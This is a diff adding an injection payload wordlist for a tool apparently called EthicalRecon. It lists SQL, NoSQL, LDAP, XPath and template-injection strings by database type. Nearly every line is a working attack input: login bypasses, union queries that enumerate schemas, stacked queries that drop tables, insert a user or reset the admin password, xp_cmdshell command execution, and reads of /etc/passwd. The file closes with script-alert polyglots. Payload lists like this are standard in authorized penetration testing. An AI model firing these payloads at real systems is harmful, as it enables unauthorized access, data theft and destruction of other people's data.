@@ -1,0 +1,162 @@
+# Advanced SQL Injection Payloads for EthicalRecon
+# Database-specific payloads for comprehensive testing
+
+# Basic injection tests
+' OR '1'='1
+' OR 1=1--
+' OR '1'='1'--
+" OR "1"="1
+" OR 1=1--
+' OR '1'='1' LIMIT 1--
+' OR 1=1 LIMIT 1--
+
+# Union-based injection
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1,2,3--
+
+# Error-based injection
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+
+# Time-based blind injection
+# MySQL
+' OR (SELECT SLEEP(5))--
+' AND (SELECT SLEEP(5))--
+' OR IF(1=1,SLEEP(5),0)--
+' AND IF(1=1,SLEEP(5),0)--
+
+# PostgreSQL
+' OR pg_sleep(5)--
+' AND pg_sleep(5)--
+
+# SQL Server
+'; WAITFOR DELAY '00:00:05'--
+' AND WAITFOR DELAY '00:00:05'--
+
+# Oracle
+' OR DBMS_LOCK.SLEEP(5)--
+' AND DBMS_LOCK.SLEEP(5)--
+
+# Boolean-based blind injection
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+
+# Database fingerprinting
+# MySQL
+' AND @@version--
+' AND version()--
+' AND user()--
+' AND database()--
+
+# PostgreSQL
+' AND version()--
+' AND user--
+' AND current_database()--
+
+# SQL Server
+' AND @@version--
+' AND user_name()--
+' AND db_name()--
+
+# Oracle
+' AND (SELECT banner FROM v$version WHERE rownum=1)--
+' AND (SELECT user FROM dual)--
+
+# Information schema enumeration
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT schema_name,NULL FROM information_schema.schemata--
+
+# Authentication bypass
+admin'--
+admin'/*
+' or 1=1#
+' or 1=1--
+') or '1'='1--
+') or ('1'='1--
+
+# Advanced evasion techniques
+' /*comment*/ OR /*comment*/ 1=1--
+' /*!50000OR*/ 1=1--
+' %55NION %53ELECT--
+' +UNION+SELECT--
+' UNION/**_**/SELECT--
+
+# Stacked queries
+'; INSERT INTO users VALUES('hacker','password')--
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('whoami')--
+
+# Second-order injection
+test'; INSERT INTO temp VALUES ('injected')--
+admin'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+# NoSQL injection (MongoDB)
+{"$ne": null}
+{"$ne": ""}
+{"$regex": ".*"}
+{"$where": "return true"}
+{"$gt": ""}
+
+# ORM injection
+{"email": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": null}}
+
+# JSON injection
+{"username": "admin", "password": {"$ne": null}}
+{"$or": [{"username": "admin"}, {"username": "administrator"}]}
+
+# XML injection
+<username>admin</username><password>' OR '1'='1</password>
+
+# LDAP injection
+*)(uid=*))(|(uid=*
+*)(cn=*))(|(cn=*
+admin)(&(password=*))
+
+# XPath injection
+' or '1'='1
+' or 1=1 or '1'='1
+'or string-length(name(/*[1]))>0 or '1'='1
+
+# Second-order SQL injection payloads
+admin'; WAITFOR DELAY '00:00:05'--
+test'; UPDATE users SET password='pwned' WHERE username='admin'--
+
+# Database-specific advanced payloads
+# MySQL
+' AND (SELECT SUBSTRING(user(),1,1))='r'--
+' AND (SELECT SUBSTRING(@@version,1,1))='5'--
+' UNION SELECT load_file('/etc/passwd'),NULL--
+
+# PostgreSQL
+' AND (SELECT substring(version(),1,1))='P'--
+' UNION SELECT lo_import('/etc/passwd'),NULL--
+
+# SQL Server
+' AND (SELECT substring(@@version,1,1))='M'--
+' UNION SELECT NULL,BulkColumn FROM OPENROWSET(BULK '/etc/passwd',SINGLE_BLOB) t--
+
+# Oracle
+' AND (SELECT substr(banner,1,1) FROM v$version WHERE rownum=1)='O'--
+' UNION SELECT UTL_FILE.GET_LINE(UTL_FILE.FILE_TYPE('/etc','passwd','R'),1),NULL FROM dual--
+
+# Automated detection strings
+${@print(md5(1337))}
+{{7*7}}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+
+# Polyglot payloads
+'">{{7*7}}<script>alert(1)</script>
+';alert(1);//';alert(1);//";alert(1);//";alert(1);//';alert(1);//
